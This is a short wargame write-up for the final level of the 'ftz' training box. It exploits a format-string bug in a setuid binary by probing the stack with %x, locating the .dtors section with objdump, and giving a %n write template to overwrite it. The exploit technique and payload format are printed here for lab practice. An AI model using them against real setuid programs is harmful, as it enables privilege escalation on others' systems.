# Level20 (Final Level)

## This level's goal
- FSB

***

```
[level20@ftz level20]$ ls -l
-rwsr-sr-x    1 clear    clear       11777 Jun 18  2008 attackme
-rw-r-----    1 root     level20       133 May 13  2002 hint

[level20@ftz level20]$ cat hint

#include <stdio.h>
main(int argc,char **argv)
{ 
  char bleh[80];
  setreuid(3101,3101);
  fgets(bleh,79,stdin);
  printf(bleh);
}
```

In the hint, I could see the printf(bleh) that I might exploit with FSB.

```
[level20@ftz level20]$ ./attackme
AAA
AAA
[level20@ftz level20]$ ./attackme
%x
4f
[level20@ftz level20]$ ./attackme
AAAA %x %x %x %x
AAAA 4f 4212ecc0 4207a750 41414141
```

4f means 79 in decimal, it seeams that I could exploit in fourth.

```
[level20@ftz level20]$ gdb tmp/attackme
(gdb) disass main
No symbol "main" in current context.
```

I could not see the symbol, so I will get information with objdump.

```
[level20@ftz level20]$ objdump -h attackme

attackme:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn

 18 .dtors        00000008  08049594  08049594  00000594  2**2
                  CONTENTS, ALLOC, LOAD, DATA
```

__DOTR-List's address is 0x08049594 which I will exploit with this.

The attack code format   
`$(printf "AAAAAddress1BBBBAddress2")%8x%8x%8x%Value1c%n%Value2c%n`





